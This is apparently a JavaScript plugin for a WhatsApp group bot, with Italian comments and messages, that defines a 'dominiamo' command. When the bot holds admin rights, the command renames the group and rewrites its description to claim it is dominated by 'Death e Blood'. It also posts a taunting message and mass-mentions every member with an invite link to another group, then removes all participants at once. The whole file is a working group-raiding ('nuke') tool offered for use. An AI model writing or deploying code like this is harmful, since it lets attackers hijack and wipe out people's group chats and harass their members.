let handler = async (m, { conn, args, groupMetadata, participants, usedPrefix, command, isBotAdmin, isSuperAdmin }) => {
    let ps = participants.map(u => u.id).filter(v => v !== conn.user.jid);
    let bot = global.db.data.settings[conn.user.jid] || {};
    if (ps == '') return;
    const delay = time => new Promise(res => setTimeout(res, time));

    switch (command) {
        case "dominiamo":  
            if (!bot.restrict) return;
            if (!isBotAdmin) return;

            // 🔥 Cambia NOME del gruppo
            let oldName = groupMetadata.subject || "";
            let newName = `${oldName} | 𝐒𝐕𝐓 𝐁𝐲 𝐃𝐞𝐚𝐭𝐡 𝐞 𝐁𝐥𝐨𝐨𝐝`;
            await conn.groupUpdateSubject(m.chat, newName);

            // 🔥 Cambia DESCRIZIONE del gruppo
            let nuovaDescrizione = `𝕼𝖚𝖊𝖘𝖙𝖔 𝕲𝖗𝖚𝖕𝖕𝖔 𝕰 𝕯𝖔𝖒𝖎𝖓𝖆𝖙𝖔 𝕯𝖆 𝕯𝖊𝖆𝖙𝖍 𝕰 𝕭𝖑𝖔𝖔𝖉`;
            await conn.groupUpdateDescription(m.chat, nuovaDescrizione);

            // 🔥 Disattiva welcome
            global.db.data.chats[m.chat].welcome = false;

            // 🔥 Messaggio introduttivo
            await conn.sendMessage(m.chat, {
                text: "𝐄𝐬𝐬𝐞𝐧𝐝𝐨 𝐜𝐡𝐞 𝐁𝐥𝐨𝐨𝐝 𝐞 𝐃𝐞𝐚𝐭𝐡 𝐬𝐨𝐧𝐨 𝐝𝐮𝐞 𝐜𝐨𝐠𝐥𝐢𝐨𝐧𝐢 𝐞 𝐧𝐨𝐧 𝐬𝐮 𝐝𝐞𝐜𝐢𝐝𝐨𝐧𝐨 𝐬𝐢 𝐜𝐡𝐢 𝐝𝐞𝐯𝐞 𝐧𝐮𝐤𝐤𝐚𝐫𝐞, 𝐧𝐮𝐤𝐤𝐚𝐧𝐨 𝐢𝐧𝐬𝐢𝐞𝐦𝐞 𝐞 𝐬𝐨𝐧𝐨 𝐟𝐞𝐥𝐢𝐜𝐢.."
            });

            // 🔥 Link + menzioni
            let utenti = participants.map(u => u.id);
            await conn.sendMessage(m.chat, {
                text: '𝐎𝐫𝐚 𝐞𝐧𝐭𝐫𝐚𝐭𝐞 𝐭𝐮𝐭𝐭𝐢 𝐪𝐮𝐢:\n\nhttps://chat.whatsapp.com/GReeEoOxlOxCVBBCyXJuEj?mode=hqrc',
                mentions: utenti
            });

            // 🔥 Kicka tutti
            let users = ps; 
            if (isBotAdmin && bot.restrict) { 
                await delay(1);
                await conn.groupParticipantsUpdate(m.chat, users, 'remove');
            }
            break;           
    }
};

handler.command = /^(dominiamo)$/i;
handler.group = true;
handler.owner = true;
handler.fail = null;

export default handler;
